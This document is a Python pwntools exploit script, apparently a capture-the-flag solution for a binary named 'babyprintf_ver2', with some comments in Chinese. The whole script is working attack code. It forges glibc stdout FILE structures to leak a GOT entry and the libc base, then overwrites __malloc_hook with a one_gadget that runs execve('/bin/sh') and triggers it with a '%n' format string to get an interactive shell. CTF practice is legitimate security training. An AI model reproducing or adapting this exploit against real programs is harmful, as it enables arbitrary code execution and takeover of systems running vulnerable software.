from pwn import *

#context.log_level = 'debug'
io = process("./babyprintf_ver2")
elf = ELF("./babyprintf_ver2")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

io.recvuntil(b'location to ')
buf = int(io.recvuntil(b'\n', drop = True), 16)
process_base = buf - 0x202010
elf.address = process_base
print("process_base:", hex(process_base))

target = elf.got['setbuf']
print("target:", hex(target))
#debug()

fake_stdout  = p64(0xfbad2887) # _flags
fake_stdout += p64(target) # _IO_read_ptr
fake_stdout += p64(target) # _IO_read_end
fake_stdout += p64(target) # _IO_read_base
fake_stdout += p64(target) # _IO_write_base
fake_stdout += p64(target+8) # _IO_write_ptr
fake_stdout += p64(target) # _IO_write_end
fake_stdout += p64(target)*2 # _IO_buf_base + _IO_buf_end
fake_stdout += p64(0)*5
fake_stdout += p64(1) # _fileno
fake_stdout += p64(0xffffffffffffffff) + p64(0x0) # 这里不能是 p64(0xa000000)
fake_stdout += p64(buf+0x100) #  _IO_lock_t *_lock 要指向 *_lock = 0
fake_stdout += p64(0xffffffffffffffff) + p64(0)
fake_stdout += p64(buf+0x110) #  struct _IO_wide_data *_wide_data 要指向一块可写内存
fake_stdout += p64(0)*3
fake_stdout += p64(0x00000000ffffffff) + p64(0)*2
fake_stdout += p64(0) # vtable
payload = p64(0xdeadbeef)*2 + p64(buf+0x18) + fake_stdout
print(hex(len(payload)))

io.sendlineafter(b'Have fun!\n', payload)
io.recvuntil(b'permitted!\n')

libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['setbuf']
print("libc_base:", hex(libc_base))

libc.address = libc_base
malloc_hook = libc.symbols['__malloc_hook']
fake_stdout  = p64(0xfbad2887) # _flags
fake_stdout += p64(malloc_hook) # _IO_read_ptr
fake_stdout += p64(malloc_hook) # _IO_read_end
fake_stdout += p64(malloc_hook) # _IO_read_base
fake_stdout += p64(malloc_hook) # _IO_write_base
fake_stdout += p64(malloc_hook) # _IO_write_ptr
fake_stdout += p64(malloc_hook+8) # _IO_write_end
fake_stdout += p64(malloc_hook)*2 # _IO_buf_base + _IO_buf_end
fake_stdout += p64(0)*5
fake_stdout += p64(1) # _fileno
fake_stdout += p64(0xffffffffffffffff) + p64(0x0) # 这里不能是 p64(0xa000000)
fake_stdout += p64(buf+0x100) #  _IO_lock_t *_lock 要指向 *_lock = 0
fake_stdout += p64(0xffffffffffffffff) + p64(0)
fake_stdout += p64(buf+0x110) #  struct _IO_wide_data *_wide_data 要指向一块可写内存
fake_stdout += p64(0)*3
fake_stdout += p64(0x00000000ffffffff) + p64(0)*2
fake_stdout += p64(0) # vtable

"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
0x4527a execve("/bin/sh", rsp+0x30, environ)
0xf03a4 execve("/bin/sh", rsp+0x50, environ)
0xf1247 execve("/bin/sh", rsp+0x70, environ)
"""
one_gadget = libc_base + 0x4527a
payload = p64(one_gadget)*2 + p64(buf+0x18) + fake_stdout
io.sendline(payload)
#debug()
io.sendline(b'%n') 
io.interactive()

